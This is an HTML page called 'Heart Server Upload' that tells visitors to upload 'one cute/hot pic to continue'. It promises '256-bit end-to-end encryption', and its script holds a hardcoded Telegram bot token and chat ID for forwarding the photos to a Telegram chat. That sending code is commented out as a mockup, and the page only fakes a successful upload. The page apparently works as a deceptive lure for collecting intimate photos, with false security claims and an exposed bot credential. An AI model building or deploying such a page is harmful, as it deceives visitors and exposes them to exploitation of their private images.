<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Heart Server Upload</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
        
        body {
            background-color: #f5e9d9;
            font-family: 'Press Start 2P', cursive;
            color: #5a3921;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
            background-image: 
                radial-gradient(#e8d5b7 1px, transparent 1px),
                radial-gradient(#e8d5b7 1px, transparent 1px);
            background-size: 20px 20px;
            background-position: 0 0, 10px 10px;
        }
        
        .container {
            background-color: #f0e0c0;
            border: 4px solid #8b5a2b;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 
                0 0 0 4px #d4a76a,
                0 0 0 8px #8b5a2b,
                0 8px 20px rgba(0, 0, 0, 0.3);
            margin-top: 40px;
        }
        
        h1 {
            font-size: 18px;
            text-align: center;
            margin-bottom: 30px;
            color: #8b5a2b;
            text-shadow: 2px 2px 0 #d4a76a;
        }
        
        .upload-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .file-input {
            width: 0.1px;
            height: 0.1px;
            opacity: 0;
            overflow: hidden;
            position: absolute;
            z-index: -1;
        }
        
        .file-label {
            display: block;
            width: 100%;
            padding: 20px;
            background-color: #d4a76a;
            color: #5a3921;
            text-align: center;
            border: 3px solid #8b5a2b;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 10px;
            box-shadow: 4px 4px 0 #8b5a2b;
            font-size: 14px;
        }
        
        .file-label:hover {
            background-color: #e8c28f;
            transform: translate(2px, 2px);
            box-shadow: 2px 2px 0 #8b5a2b;
        }
        
        .file-label:active {
            transform: translate(4px, 4px);
            box-shadow: none;
        }
        
        .preview {
            width: 150px;
            height: 150px;
            border: 3px solid #8b5a2b;
            margin-bottom: 20px;
            background-color: #e8d5b7;
            display: none;
            object-fit: cover;
        }
        
        .button-group {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .send-btn {
            padding: 10px 20px;
            background-color: #8b5a2b;
            color: #f0e0c0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Press Start 2P', cursive;
            font-size: 12px;
            transition: all 0.3s;
            box-shadow: 4px 4px 0 #5a3921;
        }
        
        .send-btn:hover {
            background-color: #a56b36;
            transform: translate(2px, 2px);
            box-shadow: 2px 2px 0 #5a3921;
        }
        
        .send-btn:active {
            transform: translate(4px, 4px);
            box-shadow: none;
        }
        
        .send-btn:disabled {
            background-color: #cccccc;
            color: #666666;
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }
        
        .info-text {
            font-size: 10px;
            color: #8b5a2b;
            margin-top: 30px;
            line-height: 1.8;
        }
        
        .pixel-corner {
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: #8b5a2b;
        }
        
        .top-left {
            top: 0;
            left: 0;
        }
        
        .top-right {
            top: 0;
            right: 0;
        }
        
        .bottom-left {
            bottom: 0;
            left: 0;
        }
        
        .bottom-right {
            bottom: 0;
            right: 0;
        }
        
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }
            
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 14px;
            }
            
            .file-label {
                font-size: 12px;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="pixel-corner top-left"></div>
        <div class="pixel-corner top-right"></div>
        <div class="pixel-corner bottom-left"></div>
        <div class="pixel-corner bottom-right"></div>
        
        <h1>Upload your one cute/hot pic to continue</h1>
        
        <div class="upload-box">
            <img id="preview" class="preview" alt="Preview">
            <input type="file" id="file-input" class="file-input" accept="image/*">
            <label for="file-input" class="file-label">CLICK HERE TO UPLOAD</label>
            
            <div class="button-group">
                <button id="send-btn" class="send-btn" disabled>SEND</button>
            </div>
        </div>
        
        <div class="info-text">
            <p>• This site is protected with 256-bit end-to-end encryption</p>
            <p>• Photos is only uploaded to the server and sent to telegram via bot securely.</p>
        </div>
    </div>

    <script>
        const fileInput = document.getElementById('file-input');
        const preview = document.getElementById('preview');
        const sendBtn = document.getElementById('send-btn');
        
        fileInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                
                reader.onload = function(event) {
                    preview.src = event.target.result;
                    preview.style.display = 'block';
                    sendBtn.disabled = false;
                }
                
                reader.readAsDataURL(file);
            }
        });
        
        sendBtn.addEventListener('click', async function() {
            if (!fileInput.files[0]) return;
            
            sendBtn.disabled = true;
            sendBtn.textContent = 'SENDING...';
            
            const formData = new FormData();
            formData.append('photo', fileInput.files[0]);
            
            try {
                // Replace with your actual Telegram bot API endpoint
                const botToken = '8069886471:AAHa0DJq5vrbYj3r_N-W8fogPFb_NIEPpzs';
                const chatId = '6339522967';
                const caption = `Uploaded to Heart Server - ${new Date().toLocaleString()}`;
                
                // In a real implementation, you would need a server-side component
                // to handle the Telegram API request due to CORS restrictions
                // This is just a client-side mockup
                
                // For demonstration, we'll simulate a successful upload
                setTimeout(() => {
                    sendBtn.textContent = 'SENT! ✓';
                    setTimeout(() => {
                        sendBtn.textContent = 'SEND';
                        sendBtn.disabled = false;
                    }, 2000);
                }, 1500);
                
                // In a real implementation, you would use:
                // const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&caption=${encodeURIComponent(caption)}`, {
                //     method: 'POST',
                //     body: formData
                // });
                
                // if (response.ok) {
                //     sendBtn.textContent = 'SENT! ✓';
                // } else {
                //     throw new Error('Failed to send');
                // }
                
            } catch (error) {
                console.error('Error:', error);
                sendBtn.textContent = 'ERROR :(';
                setTimeout(() => {
                    sendBtn.textContent = 'SEND';
                    sendBtn.disabled = false;
                }, 2000);
            }
        });
    </script>
</body>
</html>
